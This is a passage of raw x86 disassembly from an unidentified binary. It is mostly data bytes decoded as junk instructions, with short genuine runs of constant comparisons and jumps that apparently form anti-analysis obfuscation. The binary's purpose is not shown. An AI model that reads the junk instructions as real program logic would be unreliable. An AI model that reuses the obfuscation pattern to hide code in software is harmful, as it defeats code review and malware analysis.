  4018cc:	loope  0x4018a2
  4018ce:	sbb    dl,BYTE PTR [edx]
  4018d0:	cmc    
  4018d1:	call   0xdaf4:0x3904a29e
  4018d8:	sbb    ebx,DWORD PTR [edi]
  4018da:	cmp    esp,esi
  4018dc:	sub    bl,BYTE PTR [eax-0x1bba0439]
  4018e2:	int    0x22
  4018e4:	sbb    al,0x21
  4018e6:	adc    al,0xb6
  4018e8:	jmp    0x13e2c700
  4018ed:	push   eax
  4018ee:	test   BYTE PTR [esi+0x93644dd],bh
  4018f4:	mov    bh,0xaa
  4018f6:	cdq    
  4018f7:	push   0x78261fd7
  4018fc:	iret   
  4018fd:	jbe    0x401898
  4018ff:	sbb    DWORD PTR ss:[edi+0x3e7a39c3],ebp
  401906:	(bad)  
  401908:	cmp    dl,cl
  40190a:	test   al,0xee
  40190c:	mov    eax,0x5130906f
  401911:	outs   dx,BYTE PTR ds:[esi]
  401912:	jno    0x4018d9
  401914:	mov    BYTE PTR [ecx-0x2a5dce10],bh
  40191a:	xchg   esi,eax
  40191b:	push   ecx
  40191c:	lahf   
  40191d:	mov    eax,ds:0xc66d11e9
  401922:	pop    ecx
  401923:	dec    edi
  401924:	xor    esi,ebx
  401926:	jns    0x401957
  401928:	push   0x21
  40192a:	mov    BYTE PTR [edi],dh
  40192c:	fnstenv [ebx]
  40192e:	imul   esi,DWORD PTR [edi+0x21293f8f],0x1d
  401935:	mov    ebp,0x88301fc8
  40193a:	adc    esp,DWORD PTR [ecx+0x79]
  40193d:	sub    al,0xe2
  40193f:	sahf   
  401940:	lock cs dec esp
  401943:	idiv   ebx
  401945:	aaa    
  401946:	adc    eax,DWORD PTR [ebx+esi*4-0x7682c536]
  40194d:	inc    ebp
  40194e:	in     al,0x8b
  401950:	inc    ebp
  401951:	in     al,0xc7
  401953:	add    BYTE PTR [ecx-0x740760d3],ch
  401959:	inc    ebp
  40195a:	in     al,dx
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0x6d7bf628
  401994:	out    0x90,al
  401996:	xchg   ecx,eax
  401997:	jo     0x401a13
  401999:	jo     0x401a0b
  40199b:	jo     0x401a1b
  40199d:	jo     0x401a0f
  40199f:	daa    
  4019a0:	mov    ah,0xc6
  4019a2:	inc    BYTE PTR [ebp+0x1e]
  4019a5:	push   ecx
  4019a6:	lock cld 
  4019a8:	popf   
  4019a9:	or     eax,0x58e7787d
  4019ae:	(bad)  
  4019af:	out    dx,al
  4019b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019b1:	jecxz  0x401a27
  4019b3:	fsubr  st(7),st
  4019b5:	cmp    BYTE PTR [edx+0x18],ah
  4019b8:	and    bh,BYTE PTR [edx]
  4019ba:	int3   
  4019bb:	int    0xba
  4019bd:	ds push ecx
  4019bf:	popf   
  4019c0:	pop    ecx
  4019c1:	xor    DWORD PTR [eax+0x1b6aac92],edx
  4019c7:	lods   al,BYTE PTR ds:[esi]
  4019c8:	call   0x84f9:0x30657d9d
  4019cf:	push   ebx
  4019d0:	cwde   
  4019d1:	loope  0x401978
  4019d3:	adc    eax,0x7d4a1c1c
  4019d9:	(bad)  
  4019da:	out    dx,al
  4019db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019dc:	and    al,0xbd
  4019de:	fisttp DWORD PTR [ecx]
  4019e0:	loope  0x401974
  4019e2:	in     eax,0xf4
  4019e4:	in     eax,0x6c
  4019e6:	std    
  4019e7:	sub    dh,dh
  4019e9:	or     edi,ecx
  4019eb:	adc    DWORD PTR ds:0x6be332f5,ebx
  4019f1:	sbb    cl,BYTE PTR [edi+0x5f5ee46d]
  4019f7:	adc    bl,dh
  4019f9:	popa   
  4019fa:	mov    esi,0xac2361a2
  4019ff:	into   
  401a00:	aad    0x22
  401a02:	pop    esi
  401a03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a04:	in     eax,0x5d
  401a06:	push   0x2306faab
  401a0b:	mov    DWORD PTR [eax],esi
  401a0d:	xlat   BYTE PTR ds:[ebx]
  401a0e:	push   edx
  401a0f:	xlat   BYTE PTR ds:[ebx]
  401a10:	sar    BYTE PTR [edx],1
  401a12:	sub    ecx,ebp
  401a14:	imul   ecx,esp,0xffffffdf
  401a17:	sbb    dl,BYTE PTR [ecx+0x56]
  401a1a:	cs jle 0x401a6a
  401a1d:	punpckhdq mm4,QWORD PTR [edi-0x80e7569]
  401a24:	xchg   edx,eax
  401a25:	push   eax
  401a26:	mov    eax,ds:0x5775740e
  401a2b:	jmp    0x4019de
  401a2d:	fdiv   DWORD PTR [ebx+0x329f4562]
  401a33:	and    ecx,DWORD PTR ds:0x3d23b14
  401a39:	push   0x30
  401a3b:	scas   al,BYTE PTR es:[edi]
  401a3c:	enter  0x91ad,0x14
  401a40:	loope  0x4019ed
  401a42:	inc    ebx
  401a43:	jbe    0x401a2e
  401a45:	xor    dl,ch
  401a47:	outs   dx,DWORD PTR ds:[esi]
  401a48:	or     cl,bh
  401a4a:	or     esi,DWORD PTR [edi]
  401a4c:	dec    ecx
  401a4d:	and    BYTE PTR [bp+si-0x2501],al
  401a52:	imul   esi,DWORD PTR [eax],0x829c9faa
  401a58:	call   0xf178b603
  401a5d:	push   0xffffffac
  401a5f:	fdiv   DWORD PTR [edi+0x44373301]
  401a65:	out    dx,eax
  401a66:	ror    DWORD PTR [ebp+0x7e],0xf4
  401a6a:	in     al,0x1
  401a6c:	mov    DWORD PTR [edi+0x594f9122],edi
  401a72:	mov    ch,0xf
  401a74:	prefetch (bad)
  401a75:	or     eax,0x1f71b0dd
  401a7a:	test   al,0xb2
  401a7c:	rcl    ah,1
  401a7e:	xchg   BYTE PTR ds:0x89cfc9ea,dh
  401a84:	sub    al,0xe7
  401a86:	lods   eax,DWORD PTR ds:[esi]
  401a87:	popa   
  401a88:	mov    ebp,0x4b21a23c
  401a8d:	data16 sahf 
  401a8f:	ret    0x2635
  401a92:	fadd   DWORD PTR [ebx+0x4bc4c4e2]
  401a98:	mov    cl,BYTE PTR [edi-0x50]
  401a9b:	sub    bl,ah
  401a9d:	lock lds di,DWORD PTR [ecx]
  401aa1:	push   es
  401aa2:	test   BYTE PTR [esi-0x2d],al
  401aa5:	jecxz  0x401b26
  401aa7:	inc    ebx
  401aa8:	pop    es
  401aa9:	mov    cs,WORD PTR [esi*4+0x7e5d96cd]
  401ab0:	mov    dl,0x39
  401ab2:	dec    edx
  401ab4:	mov    ebx,0xaddef76e
  401ab9:	neg    BYTE PTR [edi-0x54]
  401abc:	neg    BYTE PTR [ebx+0x580b605]
  401ac2:	data16 add al,dh
  401ac5:	inc    edx
  401ac6:	jno    0x401ad1
  401ac8:	push   esp
  401ac9:	sbb    bl,BYTE PTR [eax-0x334e3b8]
  401acf:	jmp    0x573:0x697e5821
  401ad6:	sub    al,0x8c
  401ad8:	or     al,0x80
  401ada:	neg    bh
  401adc:	test   eax,0xc6e2dd08
  401ae1:	out    dx,eax
  401ae2:	sbb    BYTE PTR [ecx-0x7677b5c8],0xc5
  401ae9:	popa   
  401aea:	xchg   BYTE PTR [ecx-0x47d540df],bh
  401af0:	(bad)  
  401af1:	cmp    eax,DWORD PTR [ecx-0x74]
  401af4:	ja     0x401b18
  401af6:	cmc    
  401af7:	cmp    BYTE PTR [ecx+0x2baa8c81],ah
  401afd:	mov    bl,0x6a
  401aff:	in     al,0x85
  401b01:	or     BYTE PTR [edx+ecx*2-0x1e],0x2f
  401b06:	sbb    DWORD PTR [edx-0x66ebb66e],0xfffffff1
  401b0d:	mov    ah,0x20
  401b0f:	add    BYTE PTR [eax+0xe1eb2cf],bh
  401b15:	push   es
  401b16:	imul   ebx,DWORD PTR [ebx+0x31e68e34],0xe
  401b1d:	scas   eax,DWORD PTR es:[edi]
  401b1e:	retf   
  401b1f:	push   ebp
  401b20:	sub    BYTE PTR es:[ecx-0x322001b1],bh
  401b27:	retf   0xebcc
  401b2a:	or     al,0xd4
  401b2c:	arpl   WORD PTR [ecx+eax*1],bp
  401b2f:	adc    al,0x95
  401b31:	jmp    0xb19af193
  401b36:	inc    esi
  401b37:	push   eax
  401b38:	mov    bh,0xd0
  401b3a:	loopne 0x401adf
  401b3c:	clc    
  401b3d:	cmp    DWORD PTR [eax+ecx*4],esp
  401b40:	jb     0x401ae3
  401b42:	and    edx,DWORD PTR [ecx]
  401b44:	pop    esi
  401b45:	pop    eax
  401b46:	add    esi,DWORD PTR [ebx]
  401b48:	int    0xeb
  401b4a:	pop    ebp
  401b4b:	adc    ah,BYTE PTR [edx+0x5d]
  401b4e:	adc    DWORD PTR [edi],ebp
  401b50:	ret    
  401b51:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401b52:	aam    0x12
  401b54:	(bad)  
  401b55:	icebp  
  401b56:	(bad)  
  401b57:	and    BYTE PTR [edi-0x4f3196ae],dl
  401b5d:	rcl    DWORD PTR [eax-0x4b16ae06],1
  401b63:	pop    si
  401b65:	inc    edi
  401b66:	adc    al,0x52
  401b68:	leave  
  401b69:	mov    eax,0xb88ae8ad
  401b6e:	imul   BYTE PTR [ebp-0x59a9f21a]
  401b74:	shl    DWORD PTR [edi-0x1d],cl
  401b77:	push   ebp
  401b78:	mov    dh,0x6f
  401b7a:	ror    BYTE PTR [eax+0x9177bf3],0x72
  401b81:	push   edx
  401b82:	das    
  401b83:	iret   
  401b84:	mov    dl,0x84
  401b86:	and    DWORD PTR [esi],ebp
  401b88:	es mov al,0x39
  401b8b:	pop    ebp
  401b8c:	xchg   DWORD PTR [esi+0x36fd0604],edx
  401b92:	add    BYTE PTR [esi],al
  401b94:	pop    eax
  401b95:	loop   0x401bf0
  401b97:	push   ebx
  401b98:	std    
  401b99:	(bad)  
  401b9a:	xor    al,0x9c
  401b9c:	inc    ebx
  401b9d:	xor    ebx,DWORD PTR [edi]
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dl,dh
  401bdd:	xchg   ebp,eax
  401bde:	push   esp
  401bdf:	push   ebx
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	into   
  401be9:	js     0x401bbe
  401beb:	or     DWORD PTR [ebx+0x6b028fed],edi
  401bf1:	dec    ebx
  401bf2:	add    cl,BYTE PTR [esi+eax*8+0x50092f13]
  401bf9:	sub    al,BYTE PTR [ebx+0x5683cd50]
  401bff:	arpl   WORD PTR [ebx],sp
  401c01:	jmp    0x401be7
  401c03:	mov    dh,0x7b
  401c05:	pop    edi
  401c06:	in     al,dx
  401c07:	(bad)  
  401c08:	mov    dl,0xe1
  401c0a:	les    ebx,FWORD PTR [ebp+0x61]
  401c0d:	shl    DWORD PTR [ebx],0xce
  401c10:	xor    al,0x7d
  401c12:	inc    edx
  401c13:	mov    ds:0xc4f88481,al
  401c18:	mov    WORD PTR [edx+0x548eb803],?
  401c1e:	xchg   edx,eax
  401c1f:	push   edi
  401c20:	idiv   DWORD PTR [esi+0x7edabdb6]
  401c26:	call   0xa416:0xc6d5d446
  401c2d:	daa    
  401c2e:	inc    eax
  401c2f:	mov    eax,ds:0xeca97f71
  401c34:	out    0xff,eax
  401c36:	je     0x401bd8
  401c38:	aas    
  401c39:	cld    
  401c3a:	out    0xf5,al
  401c3c:	repz mov dl,al
  401c3f:	call   0xac71:0x8837502c
  401c46:	mov    eax,0xbcb04908
  401c4b:	dec    esi
  401c4c:	leave  
  401c4d:	leave  
  401c4e:	lahf   
  401c4f:	push   ss
  401c50:	or     al,0xc3
  401c52:	mov    ah,0x71
  401c54:	or     bl,BYTE PTR [edi]
  401c56:	dec    BYTE PTR [edi]
  401c58:	and    DWORD PTR [ebx+0x907e17d],ecx
  401c5e:	in     al,0xf6
  401c60:	ror    ah,0x7d
  401c63:	fstp   QWORD PTR [ebx+0x6958dcda]
  401c69:	and    dl,cl
  401c6b:	xor    eax,0x62e065bf
  401c70:	popa   
  401c71:	sar    esp,cl
  401c73:	push   ss
  401c74:	xor    BYTE PTR [edx+0x71],cl
  401c77:	mov    dl,0x8
  401c79:	xchg   ebp,eax
  401c7a:	and    DWORD PTR [ecx-0x1c],esp
  401c7d:	xchg   ebp,eax
  401c7e:	arpl   WORD PTR [esp+ebx*2+0x38],ax
  401c82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401c83:	addr16 push cs
  401c85:	cmc    
  401c86:	aas    
  401c87:	xor    edx,ebp
  401c89:	mov    ebx,0x150c0ad5
  401c8e:	repz push esp
  401c90:	pop    edi
  401c91:	add    DWORD PTR [esi-0x73a183b],ecx
  401c97:	cdq    
  401c98:	lea    ebx,[esi-0x427e718f]
  401c9e:	jo     0x401c74
  401ca0:	call   0x338f:0xb1a5185c
  401ca7:	retf   
  401ca8:	shl    BYTE PTR [ebx+0x5e],0x92
  401cac:	add    al,0x99
  401cae:	xor    ebx,DWORD PTR [ebx+esi*4]
  401cb1:	sar    BYTE PTR [edx-0x6b],1
  401cb4:	mov    al,ds:0x9596818a
  401cb9:	sub    ch,0x1b
  401cbc:	or     ecx,DWORD PTR [ebx+ecx*4]
  401cbf:	ins    DWORD PTR es:[edi],dx
  401cc0:	add    al,0xe5
  401cc2:	sahf   
  401cc3:	jo     0x401c84
  401cc5:	rcl    DWORD PTR [edx],0x88
  401cc8:	shr    DWORD PTR [ecx],0xa8
  401ccb:	(bad)  
  401ccc:	cmp    al,0x3f
  401cce:	push   edi
  401ccf:	aad    0xeb
  401cd1:	call   0x1ff4:0x6c9b9fd4
  401cd8:	xchg   DWORD PTR [ebp+edi*1+0x1b],edx
  401cdc:	(bad)  
  401cdd:	mov    al,0x38
  401cdf:	jle    0x401d44
  401ce1:	in     al,dx
  401ce2:	jp     0x401d0c
  401ce4:	sub    eax,eax
  401ce6:	stc    
  401ce7:	or     eax,0xe6e01162
  401cec:	sbb    eax,0x7f2586d6
  401cf1:	nop
  401cf2:	dec    ebx
  401cf3:	fsubr  QWORD PTR [edx-0x541cbc34]
  401cf9:	pop    edi
  401cfa:	pop    es
  401cfb:	ins    DWORD PTR es:[edi],dx
  401cfc:	xchg   esi,eax
  401cfd:	les    esp,FWORD PTR [ecx+0xfb39ba7]
  401d03:	push   cs
  401d04:	push   ss
  401d05:	xor    al,0xa1
  401d07:	fimul  DWORD PTR [ebp-0x479ee816]
  401d0d:	mov    ebp,0x5511111d
  401d12:	adc    al,0x79
  401d14:	cwde   
  401d15:	sbb    ch,BYTE PTR [ebx-0x5ec070b4]
  401d1b:	xchg   ecx,eax
  401d1c:	sbb    eax,0xb3550c2a
  401d21:	out    dx,al
  401d22:	xor    al,0x1c
  401d24:	pop    ds
  401d25:	or     edx,DWORD PTR [edi-0x41]
  401d28:	mov    ah,0x29
  401d2a:	in     eax,0xa8
  401d2c:	mov    cl,0x49
  401d2e:	pop    esi
  401d2f:	inc    eax
  401d30:	sbb    al,0x58
  401d32:	cdq    
  401d33:	jne    0x401ce6
  401d35:	lods   al,BYTE PTR ds:[esi]
  401d36:	push   edi
  401d37:	jl     0x401db0
  401d39:	loopne 0x401d00
  401d3b:	mov    esi,0x71d36da4
  401d40:	aam    0x24
  401d42:	cmp    DWORD PTR [ebx],esp
  401d44:	inc    edx
  401d45:	test   eax,0x8e004ef2
  401d4a:	xchg   esp,eax
  401d4b:	push   ss
  401d4c:	icebp  
  401d4d:	js     0x401d39
  401d4f:	mov    BYTE PTR [edi],ch
  401d51:	clc    
  401d52:	add    eax,edx
  401d54:	or     BYTE PTR ds:0x97e990da,ch
  401d5a:	add    BYTE PTR [ebx+0xc],0xe5
  401d5e:	pop    esp
  401d5f:	inc    eax
  401d60:	aam    0x47
  401d62:	sti    
  401d63:	and    ch,0x43
  401d66:	mov    cl,0xca
  401d68:	cs add eax,0xca441d4
  401d6e:	mov    ecx,0x4287be7
  401d73:	push   ds
  401d74:	sbb    BYTE PTR [eax+ebp*4-0x3d],bh
  401d78:	ins    DWORD PTR es:[edi],dx
  401d79:	out    0x79,eax
  401d7b:	bound  ax,DWORD PTR es:[ebp+0x710de301]
  401d83:	inc    ebp
  401d84:	adc    BYTE PTR [eax],bh
  401d86:	xchg   ebx,esp
  401d88:	dec    esi
  401d89:	addr16 xchg edx,eax
  401d8b:	sti    
  401d8c:	add    DWORD PTR [edx-0x18],esi
  401d8f:	push   esi
  401d90:	push   cs
  401d91:	ins    DWORD PTR es:[edi],dx
  401d92:	adc    dh,dh
  401d94:	ins    DWORD PTR es:[edi],dx
  401d95:	and    ebp,DWORD PTR [ebx+0x22e1f05d]
  401d9b:	pop    edx
  401d9c:	imul   ecx,DWORD PTR [ebx+ebp*1-0x450b3c16],0x97b7246e
  401da7:	hlt    
  401da8:	xor    ch,BYTE PTR [esi+0x75cf52aa]
  401dae:	icebp  
  401daf:	add    dh,bl
  401db1:	inc    ecx
  401db2:	lods   eax,DWORD PTR ds:[esi]
  401db3:	jmp    0xd5db5461
  401db8:	cwde   
  401db9:	add    edi,DWORD PTR [ebx-0x2e8bdd91]
  401dbf:	jg     0x401d81
  401dc1:	lea    ebx,[ebx+eax*4+0x70]
  401dc5:	ficomp WORD PTR [esi]
  401dc7:	adc    DWORD PTR [esi-0x33],eax
  401dca:	scas   al,BYTE PTR es:[edi]
  401dcb:	popa   
  401dcc:	je     0x401e11
  401dce:	and    eax,0xe2142506
  401dd3:	scas   al,BYTE PTR es:[edi]
  401dd4:	cmp    dh,BYTE PTR [edi]
  401dd6:	sub    DWORD PTR [ecx+0x18],esi
  401dd9:	int3   
  401dda:	shr    DWORD PTR [esi+0xd187aee],0xa1
  401de1:	xchg   DWORD PTR [eax-0x149eae88],edx
  401de7:	aas    
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [ebp+ebp*4+0x5b],dl
  401e44:	and    cl,BYTE PTR [eax+0x70]
  401e47:	push   es
  401e48:	jo     0x401eba
  401e4a:	jo     0x401eca
  401e4c:	jo     0x401ebe
  401e4e:	and    BYTE PTR [esi],0x2e
  401e51:	or     eax,0x4babe8e6
  401e56:	mov    DWORD PTR [ebx],edx
  401e58:	loop   0x401e6e
  401e5a:	std    
  401e5b:	fcmovu st,st(4)
  401e5d:	into   
  401e5e:	sbb    cl,BYTE PTR [ecx+0x49]
  401e61:	sbb    eax,0x2465c3c7
  401e66:	push   eax
  401e67:	dec    ebp
  401e68:	mov    bh,0xe7
  401e6a:	les    edi,FWORD PTR [edx-0x61]
  401e6d:	add    ecx,DWORD PTR [esi-0x2e]
  401e70:	fist   DWORD PTR [ecx+0x1e8ac088]
  401e76:	and    al,0xdc
  401e78:	icebp  
  401e79:	sub    al,0xcb
  401e7b:	clc    
  401e7c:	not    BYTE PTR [edi-0x496b2b8f]
  401e82:	mov    bh,0xeb
  401e84:	and    edi,esp
  401e86:	pop    ds
  401e87:	test   cl,bh
  401e89:	adc    bh,0x8d
  401e8c:	mov    eax,0x44070d5e
  401e91:	pop    ds
  401e92:	lea    ecx,[esi-0x57188216]
  401e98:	adc    eax,0xaf239db7
  401e9d:	dec    edi
  401e9e:	add    ebx,esi
  401ea0:	loop   0x401e25
  401ea2:	add    bl,bl
  401ea4:	fyl2x  
  401ea6:	je     0x401e45
  401ea8:	inc    esp
  401ea9:	sub    eax,0x1461b9e2
  401eae:	push   ds
  401eaf:	pop    edx
  401eb0:	imul   ebp,eax,0x69
  401eb3:	and    ah,BYTE PTR [edi-0x6310d767]
  401eb9:	xchg   edx,eax
  401eba:	and    eax,0xdeae2b70
  401ebf:	sub    al,0x41
  401ec1:	and    DWORD PTR [ecx],ebx
  401ec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ec4:	add    esi,DWORD PTR ds:0xcb131187
  401eca:	dec    ecx
  401ecc:	or     BYTE PTR ds:0xa9d96479,dh
  401ed2:	pop    ss
  401ed3:	dec    ebp
  401ed4:	jae    0x401eaa
  401ed6:	and    esi,DWORD PTR [eax-0x19539404]
  401edc:	xor    BYTE PTR [esi],dl
  401ede:	inc    ebp
  401edf:	mov    dh,BYTE PTR [esi+0x23ae3c22]
  401ee5:	adc    ebx,esp
  401ee7:	std    
  401ee8:	test   DWORD PTR [ebx+0x7e],eax
  401eeb:	push   ecx
  401eec:	or     eax,0xfd9c515c
  401ef1:	xchg   edx,eax
  401ef2:	adc    eax,0x6dfdaaad
  401ef7:	pop    esp
  401ef8:	mov    ds:0xbdcf4cad,eax
  401efd:	mov    bh,0xbd
  401eff:	mov    ds:0xdff4cc17,al
  401f04:	mov    bh,0x3
  401f06:	stos   BYTE PTR es:[edi],al
  401f07:	lock pop edi
  401f09:	imul   esp,DWORD PTR ds:0xf72502c5,0x9248551c
  401f13:	adc    ebx,DWORD PTR [esi-0xd7b1360]
  401f19:	repnz push ss
  401f1b:	pushf  
  401f1c:	aad    0x9
  401f1e:	popf   
  401f1f:	test   al,0x6b
  401f21:	fidivr WORD PTR [ebp+0x6d]
  401f24:	adc    DWORD PTR [edi-0x40e49be8],0xffffffef
  401f2b:	repz dec esp
  401f2d:	les    esi,FWORD PTR [eax]
  401f2f:	xor    BYTE PTR [edi+eax*8-0x68656547],dh
  401f36:	xchg   edi,eax
  401f37:	scas   eax,DWORD PTR es:[edi]
  401f38:	pop    ebp
  401f39:	sahf   
  401f3a:	aaa    
  401f3b:	bound  esi,QWORD PTR [edx]
  401f3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f3e:	loop   0x401f32
  401f40:	jne    0x401f4b
  401f42:	push   0x90bf9725
  401f47:	(bad)  
  401f49:	inc    edx
  401f4a:	pop    edx
  401f4b:	or     DWORD PTR [edx+0x66],ecx
  401f4e:	ja     0x401fbe
  401f50:	lea    edi,[esp+ecx*4-0x7574ee7e]
  401f57:	and    eax,0x7489a815
  401f5c:	mov    edx,0x90d7e91c
  401f61:	inc    eax
  401f62:	cs mov ebx,0xe9a2167d
  401f68:	and    eax,0x485b96d3
  401f6d:	mov    eax,0x563991d1
  401f72:	lods   eax,DWORD PTR ds:[esi]
  401f73:	fwait
  401f74:	pusha  
  401f75:	pusha  
  401f76:	push   eax
  401f77:	mov    al,ds:0x44fa892d
  401f7c:	add    al,BYTE PTR [edi+edi*8-0x4152a18f]
  401f83:	stos   BYTE PTR es:[edi],al
  401f84:	std    
  401f85:	mov    ebx,0x7c211259
  401f8a:	add    edi,DWORD PTR [edx+0x4c]
  401f8d:	aaa    
  401f8e:	mov    BYTE PTR [ebp-0x54],ch
  401f91:	(bad)  
  401f92:	rol    BYTE PTR [edx+0x14993294],cl
  401f98:	mov    WORD PTR [ebx+0x583d3652],ds
  401f9e:	inc    edi
  401f9f:	rcl    DWORD PTR [edi-0x13],0x77
  401fa3:	in     eax,0xeb
  401fa5:	mov    al,ds:0xb1283bcd
  401faa:	pop    ecx
  401fab:	ja     0x401f38
  401fad:	std    
  401fae:	jg     0x401fbd
  401fb0:	or     dh,BYTE PTR [ebx+0x6ce6891a]
  401fb6:	and    al,0x4b
  401fb8:	inc    edi
  401fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fba:	(bad)  
  401fbc:	mov    ebp,0xfc29ded7
  401fc1:	jno    0x401fdf
  401fc3:	lods   eax,DWORD PTR ds:[esi]
  401fc4:	addr16 in al,0xf2
  401fc7:	js     0x402003
  401fc9:	adc    ebp,DWORD PTR [esi-0x3e2c750b]
  401fcf:	sub    DWORD PTR [eax-0x47996962],eax
  401fd5:	and    ebx,ecx
  401fd7:	inc    ecx
  401fd8:	mov    esp,ecx
  401fda:	nop
  401fdb:	nop
  401fdc:	repnz adc ch,BYTE PTR ds:0x9489c1d4
  401fe3:	pop    eax
  401fe4:	dec    esp
  401fe5:	(bad)  
  401fe6:	sub    esp,DWORD PTR [edx]
  401fe8:	sbb    al,0x13
  401fea:	aad    0x1b
  401fec:	inc    ecx
  401fed:	mov    cl,0xa5
  401fef:	dec    ebp
  401ff0:	sub    eax,esi
  401ff2:	mov    al,0x0
  401ff4:	add    DWORD PTR [esi],ebp
  401ff6:	inc    ebx
  401ff7:	dec    ecx
  401ff8:	mov    ecx,0x93c0c650
  401ffd:	push   ss
  401ffe:	into   
  401fff:	aam    0x51
  402001:	push   ss
  402002:	add    eax,0xead862e5
  402007:	outs   dx,DWORD PTR ds:[esi]
  402008:	add    ebx,DWORD PTR [edi+0x6f45b541]
  40200e:	sbb    BYTE PTR [ecx+0x664df89b],cl
  402014:	sub    al,0x8f
  402016:	test   BYTE PTR [edx+0x14],bl
  402019:	rol    BYTE PTR [eax-0x20],0xc0
  40201d:	js     0x402095
  40201f:	push   ebp
  402020:	popf   
  402021:	push   ebx
  402022:	pop    edi
  402023:	out    0xf0,eax
  402025:	xor    DWORD PTR [ebx-0x2],edi
  402028:	mov    WORD PTR [edi],es
  40202a:	lods   al,BYTE PTR ds:[esi]
  40202b:	sub    bh,BYTE PTR [edi+0x7f]
  40202e:	dec    edi
  40202f:	dec    ebp
  402030:	cmc    
  402031:	test   eax,0xd4562f43
  402036:	push   cs
  402037:	inc    eax
  402038:	sub    BYTE PTR [ebp-0x1d6abbf8],cl
  40203e:	inc    ecx
  40203f:	retf   0x3f9d
  402042:	pushf  
  402043:	aas    
  402044:	cld    
  402045:	sahf   
  402046:	adc    ebx,ebp
  402048:	sub    BYTE PTR [edx],0x8d
  40204b:	in     eax,dx
  40204c:	sub    dh,ah
  40204e:	mov    edx,DWORD PTR [ebp-0x28]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	adc    BYTE PTR [edx-0x58],0x77
  40206d:	fidiv  DWORD PTR [eax+0x4]
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	pop    ebp
  402077:	add    eax,0xbe6e2251
  40207c:	lds    edx,FWORD PTR [edx]
  40207e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40207f:	out    0xda,eax
  402081:	pop    esp
  402082:	mov    gs,edx
  402084:	addr16 jl 0x4020f7
  402087:	int    0xa6
  402089:	daa    
  40208a:	push   esp
  40208b:	dec    DWORD PTR [edi+esi*4]
  40208e:	pop    ss
  40208f:	pop    eax
  402090:	fisub  DWORD PTR [ebx]
  402092:	xor    al,0x85
  402094:	pop    ecx
  402095:	jmp    0x40203e
  402097:	inc    esi
  402098:	pop    edx
  402099:	add    al,BYTE PTR [esp+edi*8]
  40209c:	jle    0x40208a
  40209e:	add    esp,DWORD PTR [ebx+0x41]
  4020a1:	push   ebp
  4020a2:	jbe    0x4020e9
  4020a4:	not    BYTE PTR [ebx]
  4020a6:	mov    ebx,0x42d44d6d
  4020ab:	xchg   ecx,eax
  4020ac:	aaa    
  4020ad:	fld    TBYTE PTR [eax-0x445e6768]
  4020b3:	test   DWORD PTR [esi+0xc],ecx
  4020b6:	out    0xb7,al
  4020b8:	sub    eax,0xa6df5390
  4020bd:	inc    ebx
  4020be:	push   ds
  4020bf:	stos   BYTE PTR es:[edi],al
  4020c0:	pop    es
  4020c1:	outs   dx,BYTE PTR ds:[esi]
  4020c2:	inc    edi
  4020c3:	jl     0x402067
  4020c5:	int3   
  4020c6:	pop    ss
  4020c7:	adc    BYTE PTR [eax-0x19],0x8
